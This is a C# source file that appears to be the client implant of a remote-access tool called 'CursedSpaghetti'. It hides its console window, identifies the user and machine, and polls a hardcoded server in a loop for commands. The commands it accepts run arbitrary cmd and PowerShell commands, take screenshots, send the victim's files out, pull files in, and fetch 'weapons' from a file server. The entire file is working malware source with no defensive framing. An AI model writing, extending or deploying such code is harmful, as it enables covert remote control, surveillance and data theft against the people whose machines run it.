using System;
using System.IO;
using CursedSpaghetti;

namespace SpaghettiClient
{
    class Program
    {
        static void Main(string[] args)
        {
            // Hide Console Window
            const int SW_HIDE = 0;

            IntPtr handle = Utilities.GetConsoleWindow();
            Utilities.ShowWindow(handle, SW_HIDE);


            string host = "192.168.43.35"; // change the host ip
            int fs_port = 4443; // change the fileserver port

            string url = String.Format("https://{0}/", host);
            string fs_url = String.Format("https://{0}:{1}/", host, fs_port);
            string location = Directory.GetCurrentDirectory();
            string user = Environment.UserName;
            string machinename = Environment.MachineName;
            string sessionid = String.Format("{0}@{1}", user, machinename);

            Commands commands = new Commands();

            while(true)
            {
                String cmd = Utilities.Get(url, location, sessionid);

                if (cmd.ToLower() == "exit")
                {
                    break;
                }
                else if (cmd.ToLower() == "help")
                {
                    Utilities.Post(url, Utilities.PrintHelp());
                }
                else if (cmd.ToLower() == "session")
                {
                    Utilities.Post(url, "!#!" + sessionid);
                }
                else if (cmd.ToLower() == "screenshot")
                {
                    commands.Screenshot(fs_url, url, sessionid, location);
                }
                else if (cmd.ToLower().StartsWith("cd ")) 
                {
                    location = commands.ChangeLocation(cmd, location, url);
                }
                else if (cmd.ToLower().StartsWith("download "))
                {
                    string filename = cmd.Substring(9).Replace("\"", "");
                    Utilities.Put(fs_url, url, filename, location, sessionid);
                }
                else if (cmd.ToLower().StartsWith("upload "))
                {
                    string filename = cmd.Substring(7).Replace("\"", "");
                    string target = String.Format("{0}Storage/{1}/{2}", fs_url, sessionid, filename);
                    string[] splitted = filename.Split('/');
                    filename = splitted[splitted.Length - 1];
                    Utilities.GetFile(target, url, filename, location, sessionid);
                }
                else if (cmd.ToLower().StartsWith("weapon "))
                {
                    Utilities.ChooseWeapon(fs_url, url, cmd, sessionid);
                }
                else if (cmd.ToLower().StartsWith("powershell "))
                {
                    (string output, string error) = commands.RunPSH(cmd, location);
                    output = (error.Length != 0) ? String.Concat("#!#", error) : output;

                    Utilities.Post(url, output.ToString());
                }
                else
                {
                    (string output, string error) = commands.RunCMD(cmd, location);

                    output = (error.Length != 0) ? String.Concat("#!#", error) : output;

                    Utilities.Post(url, output);
                }
            }
        }
    }
}
